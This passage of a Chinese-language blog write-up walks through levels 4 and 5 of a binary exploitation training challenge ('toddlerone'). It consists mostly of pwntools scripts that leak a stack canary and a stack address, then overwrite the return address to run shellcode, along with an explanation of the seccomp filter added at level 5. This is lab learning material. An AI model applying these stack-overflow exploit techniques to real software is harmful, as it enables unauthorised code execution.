string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xC0</span> <span class="token operator">-</span> <span class="token number">0xC0</span> <span class="token operator">-</span> <span class="token number">0x70</span><span class="token punctuation">)</span>real_payload_size <span class="token operator">=</span> <span class="token number">0x58</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level3/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>exit_code <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4a6fb1126219f9e3</span><span class="token punctuation">)</span>real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x58</span><span class="token operator">-</span>shellcode_size<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'B'</span> <span class="token operator">+</span> exit_code <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> canary_value <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> return_addressp<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level4.0"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level4.0"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>init_payload_size <span class="token operator">=</span> <span class="token number">0x48</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xB0</span> <span class="token operator">-</span> <span class="token number">0xB0</span> <span class="token operator">-</span> <span class="token number">0x60</span><span class="token punctuation">)</span>real_payload_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x60</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level3/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>exit_code <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xf58b48d72ec7b457</span><span class="token punctuation">)</span>real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">72</span><span class="token operator">-</span>shellcode_size<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'B'</span> <span class="token operator">+</span> exit_code <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> canary_value <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> return_addressp<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>这一关跟上一关没有区别，将退出状态的检验换成了限制进程的系统调用。</p><p>这段代码的功能是在程序中设置 seccomp，以限制进程只能调用指定的系统调用。其余未明确允许的系统调用会导致进程被终止。这种技术通常用于增加程序的安全性，防止未知的系统调用带来的安全风险。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>   <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Restricting system calls (default: kill)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   v17 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>     v6 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v16 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>     v7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">seccomp_syscall_resolve_num_arch</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allowing syscall: %s (number %i)\n"</span><span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v17<span class="token punctuation">,</span> <span class="token number">2147418112LL</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>v16 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>       <span class="token function">__assert_fail</span><span class="token punctuation">(</span>         <span class="token string">"seccomp_rule_add(ctx, SCMP_ACT_ALLOW, syscalls_allowed[i], 0) == 0"</span><span class="token punctuation">,</span>         <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span>         <span class="token number">0x9Cu</span><span class="token punctuation">,</span>         <span class="token string">"challenge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_load</span><span class="token punctuation">(</span>v17<span class="token punctuation">)</span> <span class="token punctuation">)</span>     <span class="token function">__assert_fail</span><span class="token punctuation">(</span><span class="token string">"seccomp_load(ctx) == 0"</span><span class="token punctuation">,</span> <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> <span class="token number">0x9Fu</span><span class="token punctuation">,</span> <span class="token string">"challenge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> requests<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level5.1"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level5.1"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>init_payload_size <span class="token operator">=</span> <span class="token number">0x30</span>  <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload_size <span class="token operator">=</span> <span class="token number">0x30</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xA0</span> <span class="token operator">-</span> <span class="token number">0xA0</span> <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span>real_payload_size <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level3/shellcode_2.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>exit_code <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xF55A7AC1D88E5605</span><span class="token punctuation">)</span>real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> exit_code <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> canary_value <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span><span class="token operator">+</span> return_addressp<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level5.0"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level5.0"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>init_payload_size <span class="token operator">=</span> <span class="token number">0x20</span>  <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload_size <span class="token operator">=</span> <span class="token number">0x20</span>  <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xA0</span> <span class="token operator">-</span> <span class="token number">0xA0</span> <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span>real_payload_size <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level3/shellcode_2.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>exit_code <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xc47c70dcf4a8eb20</span><span class="token punctuation">)</span>real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> exit_code <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> canary_value <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span><span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span><span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> return_addressp<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 